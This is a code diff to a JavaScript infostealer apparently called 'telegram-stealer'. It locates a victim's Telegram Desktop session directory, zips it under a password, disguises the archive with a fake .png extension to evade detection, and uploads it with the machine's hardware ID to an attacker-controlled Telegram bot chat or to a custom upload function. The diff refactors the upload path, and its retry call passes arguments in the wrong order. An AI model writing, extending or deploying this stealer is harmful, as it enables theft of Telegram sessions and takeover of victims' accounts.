@@ -125,11 +125,11 @@ function getHwid() {
   return machineId()
 }
 
-async function sendArchiveTelegramWebhook(archivePath, archivePassword, telegramChatId, telegramToken) {
+async function sendArchiveTelegramWebhook(archivePath, caption, telegramChatId, telegramToken, retriesLeft = 5) {
   const hwid = await getHwid()
   const form = new FormData()
   form.append('document', fs.createReadStream(archivePath, {}), { filename: `${hwid}.zip` })
-  form.append('caption', `New Telegram Desktop session archive\\!\nPassword: \`${archivePassword}\`\nHWID: \`${hwid}\``)
+  form.append('caption', caption)
   const res = await fetch(
     `https://api.telegram.org/bot${telegramToken}/sendDocument?chat_id=${telegramChatId}&parse_mode=MarkdownV2`,
     {
@@ -142,7 +142,7 @@ async function sendArchiveTelegramWebhook(archivePath, archivePassword, telegram
     console.error(`Error sending archive! Retrying in 30s - Status: ${res.error_code} - ${res.description}`)
     // Failed to send archive, try again in 30s
     await new Promise(resolve => setTimeout(resolve, 30_000))
-    return sendArchiveTelegramWebhook(archivePath, telegramChatId, telegramToken)
+    return sendArchiveTelegramWebhook(archivePath, telegramChatId, telegramToken, retriesLeft - 1)
   }
 }
 
@@ -156,19 +156,30 @@ function deleteArchive(archivePath) {
 }
 
 /**
- * @param {string} telegramChatId
- * @param {string} telegramToken
- * @param {string} archivePassword
+ * @typedef RunArg
+ * @type {object}
+ * @property {string?} telegramChatId
+ * @property {string?} telegramToken
+ * @property {((filePath: string, filename: string, caption: string) => any)?} uploadFileFn
+ * @property {string?} archivePassword
  */
-async function run(telegramChatId, telegramToken, archivePassword = 'https://github.com/rigwild/telegram-stealer') {
-  if (!telegramChatId) throw new Error('Telegram chat ID is required')
-  if (!telegramToken) throw new Error('Telegram token is required')
+
+/** @param {RunArg} arg0 */
+async function run({ telegramChatId, telegramToken, uploadFileFn, archivePassword = 'rigwild/telegram-stealer' }) {
+  if (uploadFileFn && (telegramChatId || telegramToken))
+    throw new Error('Do not provide both a custom upload function and Telegram chat ID and Telegram token!')
+  if (!uploadFileFn && (!telegramChatId || !telegramToken))
+    throw new Error('Telegram chat ID and Telegram token are required if not providing a custom upload function!')
 
   const telegramDirectoryPath = await findTelegramDirectoryPath()
   const hwid = await getHwid()
   const archivePath = path.join(tempDirectory, `${hwid}.png`) // Fake extension to prevent file type detection
   await archiveTelegramSession(telegramDirectoryPath, archivePath, archivePassword)
-  await sendArchiveTelegramWebhook(archivePath, archivePassword, telegramChatId, telegramToken)
+
+  let caption = `New Telegram Desktop session archive\\!\nArchive Password: \`${archivePassword}\``
+  if (uploadFileFn) await uploadFileFn(archivePath, `${hwid}.zip`, caption)
+  else await sendArchiveTelegramWebhook(archivePath, caption, telegramChatId, telegramToken)
+
   await deleteArchive(archivePath)
 }
 
